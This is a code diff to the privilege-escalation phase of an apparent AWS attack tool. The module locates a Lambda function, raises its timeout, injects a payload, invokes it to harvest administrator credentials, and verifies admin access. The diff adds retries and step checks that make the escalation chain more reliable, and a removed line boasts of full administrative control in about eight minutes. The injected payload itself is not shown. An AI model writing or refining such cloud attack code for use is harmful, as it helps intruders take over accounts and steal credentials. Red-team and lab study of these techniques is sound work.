@@ -37,6 +37,7 @@ from utils import (
     print_warning,
     safe_api_call,
     wait_for_lambda_update,
+    print_phase_banner
 )
 
 
@@ -380,53 +381,64 @@ def invoke_and_harvest(
 def verify_admin_access(config: AttackConfig) -> Dict[str, str]:
     """
     Confirm that the harvested credentials have administrator access.
-
-    Args:
-        config: The attack configuration (admin session must be set).
-
-    Returns:
-        Dict with the admin identity details.
+    Retries a few times since newly created keys take time to propagate.
     """
     print_step(5, "Verifying admin access")
     admin = config.require_admin_session()
     sts = admin.client("sts")
-    print_info("Waiting for new access key to propagate across AWS...")
-    time.sleep(10)
-    identity = sts.get_caller_identity()
 
-    result = {
-        "UserId": identity["UserId"],
-        "Account": identity["Account"],
-        "Arn": identity["Arn"],
-    }
-
-    print_success(f"Confirmed admin: {result['Arn']}")
-    print_info(
-        "Full administrative control achieved. "
-        "Attack time: ~8 minutes."
-    )
-    return result
+    for attempt in range(4):
+        try:
+            if attempt > 0:
+                print_info(f"Retry {attempt}/3...")
+            else:
+                print_info("Waiting for new access key to propagate across AWS...")
+            time.sleep(10)
+            identity = sts.get_caller_identity()
+            result = {
+                "UserId": identity["UserId"],
+                "Account": identity["Account"],
+                "Arn": identity["Arn"],
+            }
+            print_success(f"Confirmed admin: {result['Arn']}")
+            return result
+        except Exception as exc:
+            if attempt == 3:
+                print_error(f"Admin verification failed after 4 attempts: {exc}")
+                return {}
+    return {}
 
 
 def run_phase(config: AttackConfig) -> Dict[str, Any]:
     """
     Execute the complete Phase 2: Privilege Escalation.
-
-    Returns a dict with all results from this phase.
+    Each step checks the previous step's result before proceeding.
     """
-    from utils import print_phase_banner
 
     print_phase_banner(2, "PRIVILEGE ESCALATION")
 
     results = {}
-    results["lambda_target"] = discover_lambda_target(config)
-    results["timeout_update"] = increase_timeout(config)
-    results["code_injection"] = inject_payload(config)
-    results["harvest"] = invoke_and_harvest(config)
 
-    if results["harvest"].get("admin_credentials"):
-        results["admin_verification"] = verify_admin_access(config)
-    else:
+    results["lambda_target"] = discover_lambda_target(config)
+    if not results["lambda_target"]:
+        print_error("Cannot proceed: Lambda target not found.")
+        return results
+
+    results["timeout_update"] = increase_timeout(config)
+    if not results["timeout_update"]:
+        print_error("Cannot proceed: timeout update failed.")
+        return results
+
+    results["code_injection"] = inject_payload(config)
+    if not results["code_injection"]:
+        print_error("Cannot proceed: code injection failed.")
+        return results
+
+    results["harvest"] = invoke_and_harvest(config)
+    if not results["harvest"].get("admin_credentials"):
         print_error("Escalation failed: no admin credentials obtained.")
+        return results
+
+    results["admin_verification"] = verify_admin_access(config)
 
     return results
